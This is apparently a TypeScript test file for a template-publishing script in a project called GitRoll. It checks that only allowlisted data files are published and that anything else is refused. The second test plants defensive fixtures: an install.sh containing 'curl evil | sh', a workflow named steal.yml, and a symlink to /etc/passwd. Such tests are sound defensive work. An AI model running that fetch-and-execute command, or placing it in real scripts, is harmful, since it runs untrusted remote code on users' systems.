import "./helpers.ts";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { GitRoll } from "../src/node/repo.ts";
import { tmp } from "./helpers.ts";

const script = fileURLToPath(new URL("../scripts/publish-template.mjs", import.meta.url));

test("the published template is a valid Roll made only of data files", () => {
  const out = path.join(tmp(), "template");
  execFileSync(process.execPath, [script, "--out", out], { env: process.env, stdio: "pipe" });
  const files = fs.readdirSync(out, { recursive: true }).map(String).filter((f) => fs.statSync(path.join(out, f)).isFile()).sort();
  assert.ok(files.includes(path.join(".gitroll", "config.yaml")));
  assert.match(fs.readFileSync(path.join(out, ".gitroll/config.yaml"), "utf8"), /^template_version: 1$/m);
  // Everything published, and nothing else: no workflows, no code, nothing that
  // runs. Whatever is here is copied into every Roll made from the template.
  const published = [
    path.join(".gitroll", ".gitattributes"),
    path.join(".gitroll", ".gitignore"),
    path.join(".gitroll", "README.md"),
    path.join(".gitroll", "config.yaml"),
    path.join(".gitroll", "events", ".gitkeep"),
    "README.md",
  ].sort();
  assert.deepEqual(files, published);
  // The root README is short and points at the log; the instructions live with it.
  const readme = fs.readFileSync(path.join(out, "README.md"), "utf8");
  assert.match(readme, /\.gitroll\/events/);
  assert.match(readme, /## Using this template[\s\S]*Use this template → Create a new repository[\s\S]*namespace, not a privacy boundary[\s\S]*jimhoyd-com\/gitroll\/issues/);

  // The first thing a reader of the log sees is how to add an event with nothing installed.
  const rollReadme = fs.readFileSync(path.join(out, ".gitroll/README.md"), "utf8");
  assert.match(rollReadme, /## Log something[\s\S]*\.gitroll\/events\/2026-09-15-ac-serviced\.md[\s\S]*## Optional metadata[\s\S]*## Using GitRoll \(optional\)/);
  assert.match(rollReadme, /namespace, not a privacy\s+boundary/);
  assert.deepEqual(new GitRoll(out).check(), []);
});

/** A copy of template/ that a test can add a file to. */
function templateCopy(): string {
  const dir = path.join(tmp(), "template");
  fs.cpSync(fileURLToPath(new URL("../template", import.meta.url)), dir, { recursive: true });
  return dir;
}

function publish(template: string): { ok: boolean; output: string } {
  try {
    execFileSync(process.execPath, [script, "--out", path.join(tmp(), "out"), "--template", template], { env: process.env, stdio: "pipe" });
    return { ok: true, output: "" };
  } catch (e) {
    const err = e as { stdout?: Buffer; stderr?: Buffer };
    return { ok: false, output: `${err.stdout ?? ""}${err.stderr ?? ""}` };
  }
}

test("anything that isn't Roll data stops the publish, rather than being left out of it", () => {
  // The allowlist is what keeps code out of a stranger's Roll, so it has to
  // refuse loudly. Quietly publishing the rest would hide the mistake: the
  // template would look right while the change someone made went missing.
  assert.ok(publish(templateCopy()).ok, "template/ as it stands publishes");

  for (const [name, write] of [
    [".github/workflows/steal.yml", (dir: string) => fs.writeFileSync(path.join(dir, ".github/workflows/steal.yml"), "on: push\n")],
    ["install.sh", (dir: string) => fs.writeFileSync(path.join(dir, "install.sh"), "curl evil | sh\n")],
    [".gitroll/hook.js", (dir: string) => fs.writeFileSync(path.join(dir, ".gitroll/hook.js"), "process.exit(1)\n")],
  ] as const) {
    const dir = templateCopy();
    fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
    write(dir);
    const { ok, output } = publish(dir);
    assert.ok(!ok, `${name} must stop the publish`);
    assert.match(output, /Refusing to publish non-Roll files/);
    assert.ok(output.includes(name), `and say which file: ${name}`);
  }

  // A symbolic link is refused before it is read, wherever it points.
  const linked = templateCopy();
  fs.symlinkSync("/etc/passwd", path.join(linked, "README.md.link"));
  const { ok, output } = publish(linked);
  assert.ok(!ok, "a symbolic link must stop the publish");
  assert.match(output, /symbolic link/);
});
